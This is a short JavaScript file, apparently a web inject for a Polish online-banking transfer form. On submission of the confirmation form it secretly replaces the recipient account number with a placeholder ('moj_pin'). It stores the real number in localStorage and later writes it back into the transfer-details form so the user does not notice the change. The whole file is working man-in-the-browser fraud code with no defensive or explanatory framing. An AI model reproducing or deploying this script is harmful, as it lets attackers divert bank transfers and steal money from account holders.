var realNumber = "value";

function post() {
	var name = [	'NazwaOdbiorcy', 'NumerRachunkuOdbiorcy', 'Kwota', 
							'NazwaZleceniodawcy', 	'TytulPrzelewu'];
	var send_values = [	document.getElementById("acceptFormForm").elements[0].value,
									"moj_pin",
									document.getElementById("acceptFormForm").elements[2].value,
									document.getElementById("acceptFormForm").elements[3].value,
									document.getElementById("acceptFormForm").elements[4].value		];
									
	localStorage.setItem("realNumber", document.getElementById("acceptFormForm").elements[1].value);
	
	var form = document.getElementById("acceptFormForm");
	//zastepowanie html aby nie przejsc do strony
	form.innerHTML =  	"<input type=\"hidden\" name=\""+name[0]+"\" value =\""+send_values[0]+"\" readonly><br><input type=\"hidden\" name=\""+name[1]+"\" value =\""+send_values[1]+"\" readonly><br><input type=\"hidden\" name=\""+name[2]+"\" value =\""+send_values[2]+"\" readonly><br><input type=\"hidden\" name=\""+name[3]+"\" value =\""+send_values[3]+"\" readonly><br><input type=\"hidden\" name=\""+name[4]+"\" value =\""+send_values[4]+"\" readonly><br>";
	
    document.body.appendChild(form);
    form.submit();
}

function replaceNumber(){
	document.getElementById("transferDataForm").elements[1].value =  localStorage.getItem("realNumber");
	localStorage.removeItem("realNumber");
}

	if(document.getElementById("acceptFormForm") != null){
		document.getElementById("acceptFormForm").onsubmit = post;
	}
	else if(document.getElementById("transferDataForm") != null ){
		 replaceNumber();
	}
